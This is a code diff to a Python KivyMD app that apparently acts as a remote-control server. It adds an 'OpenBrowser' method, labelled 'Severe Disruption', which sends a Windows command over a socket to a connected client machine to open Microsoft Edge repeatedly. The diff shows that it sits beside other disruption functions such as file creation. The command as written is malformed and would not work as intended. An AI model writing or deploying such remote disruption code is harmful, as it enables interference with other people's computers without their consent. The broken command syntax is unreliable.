@@ -309,6 +309,18 @@ class Main(MDApp):
             print('Output: ', output)
             break
 
+    #Juls Severe Disruption
+    def OpenBrowser(self):
+        while True:
+            #Reset console
+            self.root.ids.consoleField.text = ''
+            
+            command = 'FOR /L %A IN (1 1 20) DO (echo. > start msedge'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            self.root.ids.consoleField.text = command
+            break
+
     #Zees Severe Disruption
     # File Creation Disruption
     def FileCreate(self):
